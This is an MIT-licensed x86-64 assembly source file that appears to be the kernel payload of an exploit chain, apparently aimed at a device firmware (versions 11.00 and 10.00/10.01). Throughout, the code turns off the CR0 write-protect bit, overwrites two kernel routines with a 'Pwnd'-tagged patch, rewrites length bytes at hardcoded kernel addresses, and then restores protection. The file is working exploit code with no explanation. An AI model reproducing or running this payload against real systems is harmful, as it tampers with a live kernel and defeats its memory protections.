; Copyright (C) 2024 Ignat Loskutov
;
; This software may be modified and distributed under the terms
; of the MIT license.  See the LICENSE file for details.

bits 64
default rel

jmp entry

patch:
    mov rdx, [rbp - 0x38]
    mov [rbx], rdx
    mov dword [rbx + 8], "Pwnd"
    nop
    nop
    nop

patch_len       equ $ - patch
%if patch_len != 17
%error "unexpected patch len"
%endif

%if FIRMWARE == 1100
addr_patch_padi equ 0xffffffff8262b494
addr_len1       equ 0xffffffff8262b3ad
addr_patch_padr equ 0xffffffff8262bc79
addr_len4       equ 0xffffffff8262bb6a
addr_len7       equ 0xffffffff8262c293
%elif FIRMWARE == 1000 || FIRMWARE == 1001
addr_patch_padi equ 0xffffffff824af084
addr_len1       equ 0xffffffff824aef9d
addr_patch_padr equ 0xffffffff824af869
addr_len4       equ 0xffffffff824af75a
addr_len7       equ 0xffffffff824afe83
%else
%error "unsupported FW"
%endif

addr_Xfast_syscall equ 0xffffffff822001c0

off_patch_padi  equ addr_patch_padi - addr_Xfast_syscall
off_patch_padr  equ addr_patch_padr - addr_Xfast_syscall
off_len1        equ addr_len1       - addr_Xfast_syscall ; 16 -> 20
off_len2        equ off_len1 + 5                         ; 16 -> 20
off_len3        equ off_patch_padi - 5                   ; 8 -> 12
off_len4        equ addr_len4       - addr_Xfast_syscall ; 16 -> 20
off_len5        equ off_len4 + 4                         ; 16 -> 20
off_len6        equ off_patch_padr - 5                   ; 8 -> 12
off_len7        equ addr_len7       - addr_Xfast_syscall ; 8 -> 12

X86_CR0_WP         equ 0x10000
MSR_SYSCALL_TARGET equ 0xc0000082


entry:
    mov ecx, MSR_SYSCALL_TARGET
    rdmsr
    shl rdx, 32
    or  rax, rdx

    mov rdx, cr0
    mov rcx, rdx
    and rcx, ~X86_CR0_WP
    mov cr0, rcx

    cld

    mov ecx, patch_len
    lea rdi, [rax + off_patch_padi]
    lea rsi, [patch]
    rep movsb
    mov ecx, patch_len
    lea rdi, [rax + off_patch_padr]
    lea rsi, [patch]
    rep movsb

    mov byte  [rax + off_len1], 20
    mov byte  [rax + off_len2], 20
    mov byte  [rax + off_len3], 12
    mov byte  [rax + off_len4], 20
    mov byte  [rax + off_len5], 20
    mov byte  [rax + off_len6], 12
    mov byte  [rax + off_len7], 12

    mov cr0, rdx

